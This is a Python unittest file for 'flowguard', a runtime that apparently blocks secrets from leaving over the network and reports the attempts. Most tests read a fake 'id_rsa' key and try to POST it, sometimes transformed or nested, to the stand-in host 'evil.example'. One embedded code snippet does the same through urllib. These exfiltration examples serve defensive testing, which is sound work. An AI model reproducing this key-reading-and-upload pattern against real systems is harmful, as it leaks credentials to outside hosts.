from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from typing import Any

from flowguard import FlowguardBlocked, FlowguardReport, FlowguardRuntime


class FakeHttpTransport:
    def __init__(self) -> None:
        self.requests: list[dict[str, Any]] = []

    def post(self, url: str, *, data: Any = None, **kwargs: Any) -> bytes:
        self.requests.append({"url": url, "data": data, "kwargs": kwargs})
        return b"ok"


class RuntimeReportTests(unittest.TestCase):
    def test_report_summarizes_blocked_secret_to_network(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(
                secret_paths=[secret_path],
                http_transport=FakeHttpTransport(),
            )

            with runtime.open(secret_path) as handle:
                secret = handle.read()

            with self.assertRaises(FlowguardBlocked):
                runtime.http.post("https://evil.example/upload", data=secret)

            report = runtime.report()

            self.assertIsInstance(report, FlowguardReport)
            self.assertEqual(report.summary.violation_count, 1)
            self.assertEqual(report.summary.blocked_count, 1)
            self.assertEqual(report.summary.allowed_send_count, 0)
            self.assertEqual(report.violations[0].policy, "SecretToNetwork")
            self.assertEqual(report.violations[0].target, "https://evil.example/upload")
            self.assertEqual(report.violations[0].labels, ["Secret"])
            self.assertIn(f"file:{secret_path}", report.violations[0].sources)
            self.assertIsNotNone(report.violations[0].timestamp)

    def test_report_includes_transform_path_for_blocked_payload(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(
                secret_paths=[secret_path],
                http_transport=FakeHttpTransport(),
            )

            with runtime.open(secret_path) as handle:
                secret = handle.read()
            payload = secret.replace("PRIVATE", "PUBLIC").lower().encode("utf-8")

            with self.assertRaises(FlowguardBlocked):
                runtime.http.post("https://evil.example/upload", data=payload)

            transforms = report_transform_operations(runtime.report())

            self.assertEqual(
                transforms,
                ["str.replace", "str.lower", "str.encode"],
            )

    def test_report_includes_transform_path_from_nested_payload(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(
                secret_paths=[secret_path],
                http_transport=FakeHttpTransport(),
            )

            with runtime.open(secret_path) as handle:
                secret = handle.read()
            payload = {"request": {"body": [secret.strip().encode("utf-8")]}}

            with self.assertRaises(FlowguardBlocked):
                runtime.http.post("https://evil.example/upload", data=payload)

            report = runtime.report()

            self.assertEqual(report.violations[0].labels, ["Secret"])
            self.assertEqual(
                report_transform_operations(report),
                ["str.strip", "str.encode"],
            )

    def test_report_summarizes_allowed_network_send(self) -> None:
        transport = FakeHttpTransport()
        runtime = FlowguardRuntime(http_transport=transport)

        runtime.http.post("https://telemetry.example/event", data=b"ok")

        report = runtime.report()

        self.assertEqual(transport.requests[0]["url"], "https://telemetry.example/event")
        self.assertEqual(report.summary.violation_count, 0)
        self.assertEqual(report.summary.allowed_send_count, 1)
        self.assertEqual(report.allowed_sends[0].target, "https://telemetry.example/event")
        self.assertEqual(report.allowed_sends[0].labels, [])
        self.assertEqual(report.allowed_sends[0].transforms, [])

    def test_report_writes_json_and_jsonl(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            runtime = FlowguardRuntime(http_transport=FakeHttpTransport())
            runtime.http.post("https://telemetry.example/event", data=b"ok")
            report = runtime.report()

            json_path = Path(tmpdir) / "flowguard-report.json"
            jsonl_path = Path(tmpdir) / "flowguard-events.jsonl"
            report.write_json(json_path)
            report.write_jsonl(jsonl_path)

            json_payload = json.loads(json_path.read_text(encoding="utf-8"))
            jsonl_lines = jsonl_path.read_text(encoding="utf-8").splitlines()

            self.assertEqual(json_payload["schema_version"], "flowguard.report.v1")
            self.assertEqual(len(jsonl_lines), report.summary.event_count)
            self.assertEqual(json.loads(jsonl_lines[0])["type"], "http_send_attempt")

    def test_generated_code_body_is_not_exported(self) -> None:
        runtime = FlowguardRuntime()
        code = "# FLOWGUARD_CODE_BODY_DO_NOT_EXPORT\nanswer = 1 + 1\n"

        result = runtime.run_python(code)
        report_json = runtime.report().to_json()

        self.assertEqual(result.globals["answer"], 2)
        self.assertNotIn("FLOWGUARD_CODE_BODY_DO_NOT_EXPORT", report_json)
        self.assertIn("code_hash", report_json)

    def test_generated_code_f_string_transform_path_is_exported(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path])
            code = """
import urllib.request
with open(secret_path) as handle:
    secret = handle.read()
payload = f"key={secret}".encode("utf-8")
req = urllib.request.Request(url, data=payload, method="POST")
urllib.request.urlopen(req)
"""

            with self.assertRaises(FlowguardBlocked):
                runtime.run_python(
                    code,
                    inputs={
                        "secret_path": str(secret_path),
                        "url": "https://evil.example/upload",
                    },
                )

            report_json = runtime.report().to_json()

            self.assertIn("str.format_value", report_json)
            self.assertIn("str.joined", report_json)
            self.assertIn("str.encode", report_json)
            self.assertNotIn("PRIVATE KEY", report_json)


def report_transform_operations(report: FlowguardReport) -> list[str]:
    return [step["operation"] for step in report.violations[0].transforms]


if __name__ == "__main__":
    unittest.main()
